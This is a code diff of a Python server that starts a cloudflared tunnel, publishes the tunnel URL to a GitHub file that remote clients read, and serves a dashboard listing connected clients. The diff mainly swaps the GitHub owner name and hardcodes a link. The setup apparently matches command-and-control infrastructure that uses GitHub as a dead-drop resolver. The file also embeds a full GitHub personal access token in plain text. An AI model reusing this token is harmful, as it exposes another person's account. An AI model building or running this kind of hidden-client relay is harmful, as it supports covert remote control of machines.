@@ -32,7 +32,7 @@ CLIENTS_FILE = DATA_DIR / "clients.json"
 CONFIG_FILE = DATA_DIR / "config.json"
 
 GITHUB_TOKEN = "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"
-GITHUB_OWNER = "gvlfction"
+GITHUB_OWNER = "yvlfiction"
 GITHUB_REPO = "server"
 GITHUB_FILE = "site"
 GITHUB_URL_FILE = f"https://raw.githubusercontent.com/{GITHUB_OWNER}/{GITHUB_REPO}/refs/heads/main/{GITHUB_FILE}"
@@ -98,11 +98,7 @@ def start_cloudflared():
         if not line:
             break
         sys.stdout.write(f"  [cf] {line.strip()}\n")
-        # The actual tunnel URL is on a line like:
-        # cloudflared ... INF |  https://words.trycloudflare.com  |
-        # Only match if the line has BOTH "https://" AND "trycloudflare.com"
         if "trycloudflare.com" in line and "https://" in line:
-            # Extract the URL between https:// and the next | or space or )
             after = line.split("https://")[1]
             url = after.split("|")[0].split()[0].rstrip(".,)")
             break
@@ -207,7 +203,7 @@ body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-heigh
     <input id="url-input" placeholder="your-tunnel.trycloudflare.com">
     <button onclick="saveUrl()">Save to GitHub</button>
     <span class="saved" id="url-saved">\u2713 saved</span>
-    <span class="github-link">Clients read from: <a href="__GITHUB_URL_FILE__" target="_blank" style="color:#0f0">github.com/__GITHUB_OWNER__/__GITHUB_REPO__/__GITHUB_FILE__</a></span>
+    <span class="github-link">Clients read from: <a href="https://github.com/yvlfiction/server/blob/main/site" target="_blank" style="color:#0f0">github.com/yvlfiction/server/site</a></span>
   </div>
   <div class="section-title">Connected Clients</div>
   <div class="clients" id="clients"><div class="empty">No clients connected</div></div>
@@ -346,11 +342,7 @@ def broadcast():
 # ─── HANDLERS ─────────────────────────────────────────────────────────────────
 
 async def index(request):
-    html = DASHBOARD_HTML.replace("__GITHUB_URL_FILE__", GITHUB_URL_FILE)
-    html = html.replace("__GITHUB_OWNER__", GITHUB_OWNER)
-    html = html.replace("__GITHUB_REPO__", GITHUB_REPO)
-    html = html.replace("__GITHUB_FILE__", GITHUB_FILE)
-    return web.Response(text=html, content_type="text/html")
+    return web.Response(text=DASHBOARD_HTML, content_type="text/html")
 
 async def api_config_get(request):
     return web.json_response(config)
